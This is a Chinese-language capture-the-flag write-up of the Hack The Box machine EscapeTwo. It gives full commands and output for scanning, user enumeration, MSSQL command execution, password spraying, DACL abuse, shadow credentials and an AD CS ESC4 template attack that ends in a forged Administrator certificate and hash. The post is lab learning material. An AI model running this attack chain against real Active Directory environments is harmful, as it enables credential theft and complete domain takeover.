---
layout: post
title: HTB——Escapetwo
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Escapetwo/03.png?raw=true)

# 0x01 信息收集

---

靶机介绍界面有给一个初始账密`rose / KxEPkKe6R8su`,我们先照例进行IP的信息收集，再尝试使用此账密进行进一步的探测。

```bash
┌──(root㉿kali)-[/home/kali/TscanClient_linux]
└─# ./TscanClient_linux_amd64_v2.7.4 -h 10.129.245.245 -p 1-65535 -t 800

 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.4  Expired: 2026.01.01
[22:51:38] [INFO] Start IpScan:10.129.245.245
[22:51:38] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[22:51:40] [+] 10.129.245.245:88 open
[22:51:40] [+] 10.129.245.245:139 open
[22:51:40] [+] 10.129.245.245:53 open
[22:51:40] [+] 10.129.245.245:135 open
[22:51:40] [+] 10.129.245.245:389 open
[22:51:40] [+] 10.129.245.245:445 open
[22:51:40] [+] 10.129.245.245:636 open
[22:51:40] [+] 10.129.245.245:464 open
[22:51:40] [+] 10.129.245.245:593 open
[22:51:40] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.245.245:389 [0.n.d.e.0.]0.domainFunctionality1.70.forestFunctio]
[22:51:40] [INFO] start LDAP check 10.129.245.245:389
[22:51:40] [+] 开始 LdapScan 任务: LDAP://10.129.245.245:389
[22:51:40] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.245.245:593 [ncacn_http/1.0]
[22:51:41] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.245.245:135 [.@]
[22:51:41] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.245.245:139 [.]
[22:51:41] [INFO] start WMI check 10.129.245.245:135
[22:51:41] [+] 开始 WmiExec 任务: WMI://10.129.245.245:135
[22:51:43] [+] 10.129.245.245:1433 open
[22:51:43] [+] [TCP/MSSQL]  [Microsoft SQL Server 2019 15.00.$I(1,">")] 10.129.245.245:1433 [.%]
[22:51:43] [INFO] start SQLServer check 10.129.245.245:1433
[22:51:43] [+] 开始 MssqlScan 任务: SQLServer://10.129.245.245:1433
[22:51:45] [+] [TCP/KPASSWD5]   10.129.245.245:464 
[22:51:46] [+] [TCP/MICROSOFT-DS]   10.129.245.245:445 
[22:51:46] [INFO] start SMB check 10.129.245.245:445
[22:51:46] [+] 开始 SmbScan 任务: SMB://10.129.245.245:445
[22:51:48] [+] [TCP/SPARK]  [Apache Spark] 10.129.245.245:88 [.]
[22:51:52] [+] 10.129.245.245:3269 open
[22:51:52] [+] 10.129.245.245:3268 open
[22:51:56] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.245.245:3268 [0.n.d.e.0.]0.domainFunctionality1.70.forestFunctio]
[22:51:56] [INFO] start LDAP check 10.129.245.245:3268
[22:51:56] [+] 开始 LdapScan 任务: LDAP://10.129.245.245:3268
[22:52:01] [+] [TCP/SSL]   10.129.245.245:636 [.M.g.K )3.r.<.i s.3%.S.v.fu.b.J.| /.0.-.*0.&0.T.C.]                                                        
[22:52:01] [INFO] start LDAPS check 10.129.245.245:636
[22:52:01] [+] 开始 LdapsScan 任务: LDAPS://10.129.245.245:636
[22:52:01] [+] 10.129.245.245:5985 open
[22:52:05] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.245.245:3269 [0.n.d.e.0.]0.domainFunctionality1.70.forestFunctio]
[22:52:05] [INFO] start LDAP check 10.129.245.245:3269
[22:52:05] [+] 开始 LdapScan 任务: LDAP://10.129.245.245:3269
[22:52:08] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.245.245:5985 [Not Found]                               
[22:52:08] [INFO] start WinRM check 10.129.245.245:5985
[22:52:08] [+] 开始 WinRMScan 任务: WinRM://10.129.245.245:5985
[22:52:13] [+] 10.129.245.245:9389 open
[22:52:18] [+] [TCP/ADWS]   10.129.245.245:9389
```

还有一个fscan的扫描结果。两款扫描工具各有千秋，我比较倾向都用一遍。

```bash
┌──(root㉿kali)-[/home/kali/penetration]
└─# ./fscan -h 10.129.245.245
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0
                                                                                          
[2025-03-30 22:50:50] [INFO] 暴力破解线程数: 1                                            
[2025-03-30 22:50:50] [INFO] 开始信息扫描
[2025-03-30 22:50:50] [INFO] 最终有效主机数量: 1
[2025-03-30 22:50:50] [INFO] 开始主机扫描
[2025-03-30 22:50:50] [INFO] 有效端口数量: 233
[2025-03-30 22:50:50] [SUCCESS] 端口开放 10.129.245.245:135
[2025-03-30 22:50:50] [SUCCESS] 端口开放 10.129.245.245:139
[2025-03-30 22:50:50] [SUCCESS] 端口开放 10.129.245.245:389
[2025-03-30 22:50:50] [SUCCESS] 端口开放 10.129.245.245:445
[2025-03-30 22:50:50] [SUCCESS] 端口开放 10.129.245.245:88
[2025-03-30 22:50:51] [SUCCESS] 端口开放 10.129.245.245:1433
[2025-03-30 22:50:56] [SUCCESS] 服务识别 10.129.245.245:139 =>  Banner:[.]
[2025-03-30 22:50:56] [SUCCESS] 服务识别 10.129.245.245:445 => 
[2025-03-30 22:50:56] [SUCCESS] 服务识别 10.129.245.245:88 => 
[2025-03-30 22:50:56] [SUCCESS] 服务识别 10.129.245.245:1433 => [ms-sql-s] 版本:15.00.$I(1,">") 产品:Microsoft SQL Server 2019 Banner:[.%.]                             
[2025-03-30 22:50:56] [SUCCESS] 服务识别 10.129.245.245:389 => 
[2025-03-30 22:51:56] [SUCCESS] 服务识别 10.129.245.245:135 => 
[2025-03-30 22:51:56] [INFO] 存活端口数量: 6
[2025-03-30 22:51:56] [INFO] 开始漏洞扫描
[2025-03-30 22:51:56] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle                                                              
[2025-03-30 22:51:57] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.245.245                                                                  
主机名: DC01                                                                              
发现的网络接口:                                                                           
   IPv4地址:                                                                              
      └─ 10.129.245.245                                                                   
[2025-03-30 22:54:42] [SUCCESS] 扫描已完成: 10/10
```

拿到主机信息发现开了mssql，但是没开80，那就只能直接进行域内的各项信息枚举了。首先我们需要使用提供的账户对域内用户进行枚举。默认域名即为`escapetwo.htb`，DC名为DC01。这里我们使用`nxc`的`ldap`模块进行域内用户的枚举。因为只枚举用户，我们需要`grep`一下`SidTypeUser`才可以。

---

# 0x02 域内信息枚举&喷洒

---

```bash
┌──(kali㉿kali)-[~/penetration]
└─$ crackmapexec smb 10.129.245.245 -u rose -p 'KxEPkKe6R8su' --rid-brute | grep SidTypeUser
SMB                      10.129.245.245  445    DC01             500: SEQUEL\Administrator (SidTypeUser)
SMB                      10.129.245.245  445    DC01             501: SEQUEL\Guest (SidTypeUser)
SMB                      10.129.245.245  445    DC01             502: SEQUEL\krbtgt (SidTypeUser)
SMB                      10.129.245.245  445    DC01             1000: SEQUEL\DC01$ (SidTypeUser)
SMB                      10.129.245.245  445    DC01             1103: SEQUEL\michael (SidTypeUser)
SMB                      10.129.245.245  445    DC01             1114: SEQUEL\ryan (SidTypeUser)
SMB                      10.129.245.245  445    DC01             1116: SEQUEL\oscar (SidTypeUser)
SMB                      10.129.245.245  445    DC01             1122: SEQUEL\sql_svc (SidTypeUser)
SMB                      10.129.245.245  445    DC01             1601: SEQUEL\rose (SidTypeUser)
SMB                      10.129.245.245  445    DC01             1607: SEQUEL\ca_svc (SidTypeUser)
```

拿到了这些用户。接下来我们使用smb服务枚举域内服务与该rose账号下的smb共享信息。

```bash
┌──(kali㉿kali)-[~/penetration]
└─$ smbmap -u rose -p 'KxEPkKe6R8su' -H 10.129.245.245

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                            [|] Checking for open ports...                                                            [/] Checking for open ports...                                                            [*] Detected 1 hosts serving SMB                                                         [*] Established 1 SMB connections(s) and 1 authenticated session(s)                       [+] IP: 10.129.245.245:445      Name: escapetwo.htb             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Accounting Department                                   READ ONLY
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY 
[*] Closed 1 connections
```

发现`Accounting Department`,继续跟进看看里面有什么。

```bash
┌──(kali㉿kali)-[~/penetration]
└─$ smbmap -u rose -p 'KxEPkKe6R8su' -H 10.129.245.245 -r 'Accounting Department'        

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                            [|] Checking for open ports...                                                            [/] Checking for open ports...                                                            [*] Detected 1 hosts serving SMB        
[*] Established 1 SMB connections(s) and 1 authenticated session(s)
[+] IP: 10.129.245.245:445      Name: escapetwo.htb             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Accounting Department                                   READ ONLY
        ./Accounting Department
        dr--r--r--                0 Sun Jun  9 07:11:31 2024    .
        dr--r--r--                0 Sun Jun  9 07:11:31 2024    ..
        fr--r--r--            10217 Sun Jun  9 07:11:31 2024    accounting_2024.xlsx
        fr--r--r--             6780 Sun Jun  9 07:11:31 2024    accounts.xlsx
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
[*] Closed 1 connections
```

获得到两个xlsx文件，我们下载下来查看文件内容。

```bash
┌──(root㉿kali)-[/home/kali/HTB/EscapeTwo]
└─# smbmap -u rose -p 'KxEPkKe6R8su' -H 10.129.245.245 --download 'Accounting Department\accounting_2024.xlsx'

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\] Checking for open ports...                                                            [|] Checking for open ports...                                                            [/] Checking for open ports...                                                            [*] Detected 1 hosts serving SMB        
[-] Initializing hosts...                                                                 [*] Established 1 SMB connections(s) and 1 authenticated session(s)
[+] Starting download: Accounting Department\accounting_2024.xlsx (10217 bytes)
[+] File output to: /home/kali/HTB/EscapeTwo/10.129.245.245-Accounting Department_accounting_2024.xlsx
[*] Closed 1 connections
```

观察到`accounts.xlsx`内部有四个`username`和对应的`password`，其中最后一个账号名为`sa`，即`mssql`的默认账户名，再联想到目标主机开放的1433端口，很难没有打的欲望。最先想到的就是`MDUT`上一下，但是各组件无激活权限，限制的很死。那我们只能使用`nxc`先上一下看看了。

---

# 0x03 Mssql账密利用

---

```bash
┌──(kali㉿kali)-[~]
└─$ nxc mssql escapetwo.htb -u sa -p 'MSSQLP@ssw0rd!' --local-auth -X 'whoami'
MSSQL       10.129.245.245  1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.129.245.245  1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
MSSQL       10.129.245.245  1433   DC01             [+] Executed command via mssqlexec
MSSQL       10.129.245.245  1433   DC01             sequel\sql_svc
```

翻阅SQL配置文件，发现有记录域内`sql_svc`账户的账密。`SEQUEL\sql_svc:WqSZAF6CysDQbGb3`。把这条信息与上面xlsx表格内的密码做成pass.txt，把域内所有账户汇总成user.txt，统一做密码喷洒。使用`nxc`进行喷洒。注意指定的目标主机必须为域名而非IP，否则`crackmapexec`会无回显直接退出。

```bash
┌──(root㉿kali)-[/home/kali/HTB/EscapeTwo]
└─# crackmapexec smb escapetwo.htb -u user.txt -p pass.txt -d sequel.htb --continue-on-success
SMB         escapetwo.htb   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         escapetwo.htb   445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
SMB         escapetwo.htb   445    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
SMB         escapetwo.htb   445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG 
SMB         escapetwo.htb   445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3 
```

得到了`ryan`账户和`oscar`账户的域内账密信息。首先尝试使用ryan账户看看能不能上到WinRM。之前的信息收集发现开放了WinRM。毕竟是没有开放3389，不然咱们直接上RDP更爽了就。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Escapetwo/01.png?raw=true)

拿到user的flag后，我们需要尝试提权。首先我们尝试使用`python-BloodHound`去收集域内信息。因为我们没办法使用3389上线，只能借助其他工具了。

---

# 0x04 域内结构分析

---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Escapetwo/02.png?raw=true)

点击`Node Info`中的`Transitive Object Control`按钮，可查看关于选定`Node`的所有域内连接关系。我们查看到ryan对ca_svc账户具有`WriteOwner`即编辑所有者权限。那我们可以将`ca_svc`用户所有者设定为掌握的`ryan`用户。然后使用`owner`关系将ryan对ca_svc权限设置为`fullcontrol`。因为`ca_svc`是`cert publishers`组的成员，拥有证书发放的权限。故我们拿到ca_svc后就可以利用AD CS进行提权了。

首先使用`bloodyAD`先对ca_svc设置`owner`关系。

```bash
┌──(root㉿kali)-[/home/kali/HTB/EscapeTwo]
└─# bloodyAD -d sequel.htb -u ryan -p 'WqSZAF6CysDQbGb3' --dc-ip 10.129.245.245 --host 10.129.245.245 --dns 10.129.245.245 set owner 'ca_svc' 'ryan'
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
```

更换`owner`关系后，我们设置`ryan`对`ca_svc`的权限为fullcontrol，并为其创建影子证书，来获取到`ca_svc`的NTLM hash。首先使用`impacket`更改`dacl`权限

```bash
┌──(root㉿kali)-[/home/kali]
└─# impacket-dacledit -action 'write' -rights FullControl -principal 'ryan' -target 'ca_svc' "sequel.htb/ryan:WqSZAF6CysDQbGb3"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] DACL backed up to dacledit-20250331-054022.bak
[*] DACL modified successfully!
```

接下来我们创建影子凭证，并借此获取到`ca_svc`的NTLM hash。关于`shadow credentials`的详细介绍，可以参考博客中的`AD CS剖析`，或参考以下文章:

- [奇安信攻防社区-红队域渗透权限维持技术：Shadow Credentials](https://forum.butian.net/share/1607)

这里我们使用`certipy-ad`来进行影子用户的创建。

```bash
┌──(kali㉿kali)-[~]
└─$ certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.129.245.245                                         
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '9c625779-da06-a4a3-4ee6-f166c887601b'
[*] Adding Key Credential with device ID '9c625779-da06-a4a3-4ee6-f166c887601b' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '9c625779-da06-a4a3-4ee6-f166c887601b' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

---

# 0x05 AD CS ESC4提权

---

拿到`ca_svc`的NT hash后我们就算是完全掌控此账户了。注意上述三个操作一定要连续，中间间隔一段时间后后面的操作就可能会失败。我们使用`certipy`来探测一下域内的漏洞模板。

```bash
┌──(kali㉿kali)-[~]
└─$ certipy-ad find -text -dc-ip 10.129.245.245 -target-ip 10.129.245.245 -ns 10.129.245.245 -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Saved text output to '20250331055239_Certipy.txt'
```

记得将CA加入hosts文件。阅读生成的txt结果，观察到一个可攻击的ESC4危险模板。

```bash
 	Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

危险模板为`DunderMifflinAuthentication`,我们按ESC4路径攻击。重写模板信息，并申请`administrator`的票据。

```bash
┌──(kali㉿kali)-[~]
└─$ certipy-ad template -u ca_svc@sqluel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.129.245.245 -target-ip 10.129.245.245 -ns 10.129.245.245 -template 'DunderMifflinAuthentication'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

更新完之后，使用此模板去申请`Administrator`的票据。注意申请的指定用户参数为`-upn`。

```bash
┌──(kali㉿kali)-[~]
└─$ certipy-ad req -template 'DunderMifflinAuthentication' -upn Administrator@sequel.htb -dc-ip 10.129.245.245 -target-ip 10.129.245.245 -ca sequel-DC01-CA -ns 10.129.245.245 -target DC01.sequel.htb -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

拿到了`administrator`的pfx票据，本题也就宣告结束了。当然也可以使用`certipy-ad`来借助pfx获取`Administrator`的NTLM hash

```bash
┌──(root㉿kali)-[/home/kali/HTB/EscapeTwo]
└─# certipy-ad auth -pfx administrator.pfx   
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

---

# 0x06 总结

感觉很难的一台机子，不理解为什么HTB会把它放在赛季的第一台靶机，而且难度还给的easy。算是把域内各个信息收集手段全考了一遍。重点考察工具的使用熟练度。